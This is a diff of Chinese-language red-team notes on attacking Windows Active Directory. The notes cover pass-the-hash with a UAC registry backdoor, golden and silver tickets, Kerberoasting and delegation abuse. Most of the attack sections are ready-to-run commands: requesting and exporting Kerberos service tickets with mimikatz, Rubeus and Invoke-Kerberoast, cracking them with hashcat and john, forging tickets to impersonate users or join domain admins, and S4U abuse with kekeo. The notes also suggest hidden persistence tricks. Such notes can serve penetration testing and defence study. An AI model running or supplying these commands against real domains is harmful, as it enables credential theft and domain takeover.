-    那如何禁用 UAC 的限制？如果注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` 项存在(默认不存在)且配置为 1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非 RID 500 帐户连接，并且可以成功传递哈希值！
-
-    默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，在配置 winrm 的时候，也会遇到同样的问题，本地管理员组的非 RID500 账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。
-
-#### PTH with RDP
-
-![](../../../../assets/img/才怪.png)
-
----
-
 ### PTT
 
 票据传递攻击（PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。
@@ -1064,6 +1112,7 @@ PS : Server Session Key 在未发送 Ticket 之前，服务器是不知道 Serve
 这样，我们就可以访问域内任意一台服务器.
 
 **黄金票据的注意事项**
+
 - Windows 事件日志不区分 TGT 的合法性，即黄金票据的行为隐蔽性高
 - 伪造黄金票据的时候，可以离线生成，减少痕迹
 - krbtgt 的密码被修改了，生成的黄金票据就会失效
@@ -1074,6 +1123,7 @@ PS : Server Session Key 在未发送 Ticket 之前，服务器是不知道 Serve
 - 可以使用禁用、删除的帐户进行冒充，甚至是在 Active Directory 中不存在的帐户
 
 **常见域内账户 SID**
+
 - 域用户 SID：S-1-5-21 -513
 - 域管理员 SID：S-1-5-21 -512
 - 架构管理员 SID：S-1-5-21 -518
@@ -1113,12 +1163,6 @@ mimikatz 的 Golden_Tickets 相关操作见 [mimikatz 笔记](../../安全工具
 
 - 认证流程不同
     - Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要
-
----
-
-### PTK
-
-mimikatz 的 PTK 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ptk)
 
 ---
 
@@ -1165,52 +1209,55 @@ get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * 
 import-module .\Microsoft.ActiveDirectory.Management.dll
 ```
 
-Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后会生成，直接在域控上环境就能扣出来
+Microsoft.ActiveDirectory.Management.dll 在安装 powershell 模块 Active Directory 后会生成，直接在域控上环境就能扣出来
 
 使用 gpedit.msc 将域控上的组策略管理编辑器打开,`计算机配置-->Windows设置-->安全设置-->安全选项-->"网络安全: 配置 Kerberos 允许的加密类型"`，配置 Kerberos 的加密类型为 RC4，并运行 gpupdate 更新策略
+
+**导出**
 
 - https://github.com/nidem/kerberoast
 
 使用 Kerberoast 中的 GeUserSPNs 进行扫描：
-```
+```bash
 setspn.exe -q */*
-或
-cscript GetUserSPNs.vbs
+
+# 或
+.\GetUserSPNs.vbs
 ```
 
-请求指定的 ST 票据:
-```
+根据微软提供的类 KerberosRequeststorSecurityToken 发起 Kerberos 请求申请票据, 请求指定的 ST 票据:
+```bash
 Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-0day.0day.org:1433"
-```
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-ffffffff0x.ffffffff0x.com:1433"
 
-或请求全部票据：
-```
-setspn.exe -T 0day.org -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.Post Context[0].Trim() }
+# 或请求全部票据
+setspn.exe -T ffffffff0x.com -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.Post Context[0].Trim() }
 ```
 
 使用 klist 命令查看当前会话存储的 Kerberos 票据：
-```
+```bash
 klist
 ```
 
 使用 mimikatz 导出内存中的票据(mimikatz 无需提权)：
-```
+```bash
 kerberos::list /export
 ```
 
+**破解**
+
 使用 https://github.com/nidem/kerberoast 工具破解，得到 sqlsrv 密码为 Admin12345：
-```
-python tgsrepcrack.py dict.txt 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
+```bash
+python tgsrepcrack.py dict.txt 2-40a00000-jack@MSSQLSvc~Srv-DB-ffffffff0x.ffffffff0x.com~1433-ffffffff0x.com.kirbi
 ```
 
 Kerberos 的票据是使用 NTLM Hash 进行签名，上述已经破解密码，就可以使用 Kerberoast 脚本重写票据，这样就可以假冒任何域用户或者虚假的账户，也可以将用户提升到域管中：
-```
-python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi -w test.kirbi -u 500
-python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi -w test.kirbi -g 512
+```bash
+python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-ffffffff0x.ffffffff0x.com~1433-ffffffff0x.com.kirbi -w test.kirbi -u 500
+python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-ffffffff0x.ffffffff0x.com~1433-ffffffff0x.com.kirbi -w test.kirbi -g 512
 ```
 
-```
+```bash
 kerberos::ptt test.kirbi
 ```
 攻击者知道一台服务器(或多台服务器)的服务账户和密码，就可以通过此方法将其域用户权限提升到域管。
@@ -1223,40 +1270,42 @@ kerberos::ptt test.kirbi
 
 kerberoast 攻击，利用 mimikatz 从内存中导出票据破解。而 Kerberoasting 攻击可以不使用 mimikatz，且普通用户权限就可以实现。
 
-- https://github.com/GhostPack/Rubeus
+**导出**
+- **Rubeus**
+    - https://github.com/GhostPack/Rubeus
+        ```
+        Rubeus.exe kerberoast
+        ```
+
+- **Invoke-Kerberoast**
+
+    也可以在域内一台主机上导入 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ，以普通用户权限执行：
+    ```powershell
+    Import-Module .\Invoke-Kerberoast.ps1
+    Invoke-Kerberoast -Outputformat Hashcat | fl > test1.txt
     ```
-    Rubeus.exe kerberoast
+
+    只提取出 hash 的命令：
+    ```powershell
+    Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
     ```
 
-也可以在域内一台主机上导入 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ，以普通用户权限执行：
-```powershell
-Import-Module .\Invoke-Kerberoast.ps1
-Invoke-Kerberoast -OutputFormat Hashcat | fl
-```
+- **GetUserSPN**
+    使用 impacket 中的 GetUserSPN.py 也可以获取，不过需要域用户名和密码：
+    ```powershell
+    GetUserSPNs.exe -request -c -ip 192.168.3.142 ffffffff0x.com/sqlsvr
+    ```
 
-只提取出hash的命令：
-```powershell
-Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
-```
+- 也可以使用 https://github.com/blacklanternsecurity/Convert-Invoke-Kerberoast
 
-使用 impacket 中的 GetUserSPN.py 也可以获取，不过需要域用户名和密码：
-```powershell
-GetUserSPNs.exe -request -
-c-ip 192.168.3.142 0day.org/sqlsvr
-```
-也可以使用 https://github.com/blacklanternsecurity/Convert-Invoke-Kerberoast
-
-使用hashcat指定字典解密：
+**解密**
 ```bash
-hashcat -m 13100 hash.txt dict.txt -o /opt/dict/dist.list --force
+# 使用 hashcat 解密
+hashcat -m 13100 hash.txt dict.txt -o /opt/dict/dist.list --force   # 使用字典
+hashcat -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l   # 使用掩码
 
-//使用hashcat破解
-hashcat64.exe -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l
-
-//使用john破解
-
+# 使用 john 破解
 ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi > /tmp/johnkirb.txt
-
 ./john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
@@ -1272,7 +1321,7 @@ hashcat64.exe -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l
 
 加载 powerview，查询无约束委派账户：
 ```powershell
-Get-NetUser -Unconstrained -Domain 0day.org
+Get-NetUser -Unconstrained -Domain ffffffff0x.com
 
 //另外一个版本的Powerview
 Get-DomainUser -Properties useraccountcontrol,msds-allowedtodelegateto| fl
@@ -1280,7 +1329,7 @@ Get-DomainUser -Properties useraccountcontrol,msds-allowedtodelegateto| fl
 
 加载 powerview，查询无约束委派机器：
 ```powershell
-Get-NetComputer -Unconstrained -Domain 0day.org
+Get-NetComputer -Unconstrained -Domain ffffffff0x.com
 
 //另外一个版本的Powerview
 Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose| ft -a
@@ -1288,11 +1337,11 @@ Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontr
 
 加载 powerview，枚举域内所有的服务账号，查看哪些账号被设置了委派，以及是何种类型的委派设置：
 ```powershell
-Get-NetUser -TrustedToAuth -Domain 0day.org
+Get-NetUser -TrustedToAuth -Domain ffffffff0x.com
 
 Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
 
-Get-DomainComputer -TrustedToAuth -Domain 0day.org
+Get-DomainComputer -TrustedToAuth -Domain ffffffff0x.com
 ```
 当一个用户具备对某个服务账号的 SeEnableDelegationPrivilege 权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用 SeEnableDelegationPrivilege 属性，制作极其隐蔽的后门。
 
@@ -1303,13 +1352,15 @@ Get-DomainComputer -TrustedToAuth -Domain 0day.org
 ![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/1.png)
 
 ```
-kekeo.exe "tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345" exit
+kekeo.exe "tgt::ask /user:sqlsvr /domain:ffffffff0x.com /password:Admin12345" exit
 
-kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:administrator@0day.org /service:/service:service_to_access" exit
+kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@ffffffff0x.com_krbtgt~ffffffff0x.com@ffffffff0x.com.kirbi /user:administrator@ffffffff0x.com /service:/service:service_to_access" exit
 
 
 Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
 ```
+
+---
 
 ## 毒化LLMNR和NBT-NS请求
 
